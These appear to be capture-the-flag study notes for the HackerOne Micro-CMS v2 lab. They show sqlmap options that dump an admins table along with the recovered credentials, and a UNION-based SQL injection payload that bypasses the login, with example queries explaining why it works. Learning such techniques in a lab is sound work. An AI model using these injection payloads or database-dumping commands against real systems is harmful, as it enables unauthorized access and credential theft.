# Micro-CMS v2

`
Blind SQLi

SQLmap

```bash
--level 5 --risk 3 -p username --batch --threads 10 -T admins -D level2 -  
-dump
```

```text
+----+----------+----------+  
| id | password | username |  
+----+----------+----------+  
| 1  | cheryl   | joellen  |  
+----+----------+----------+
```


Change request method

![Pasted image 20241114192816.png](../../assets/images/c346e99cd2884990a8ff.png)

SQLi

```sql
test' UNION SELECT 'danidani'-- -
```

![Pasted image 20241114193326.png](../../assets/images/33824e9a87a92f1d81fd.png)

```sql
SELECT password FROM admins where username='joellen'
```
returns cheryl

```sql
SELECT password FROM admins where username='joellen' UNION SELECT 'password'
```
returns cheryl

```sql
SELECT password FROM admins where username='test' UNION SELECT 'password'
```
returns password (with no real username)

![Pasted image 20241114193731.png](../../assets/images/9e5ea40f8e5e6b00531a.png)


```sql
SELECT password FROM admins where username='test' UNION SELECT 'danidani'
```
returns danidani (with no real username)

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | BB/Hackerone/3 - Micro-CMS v2.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
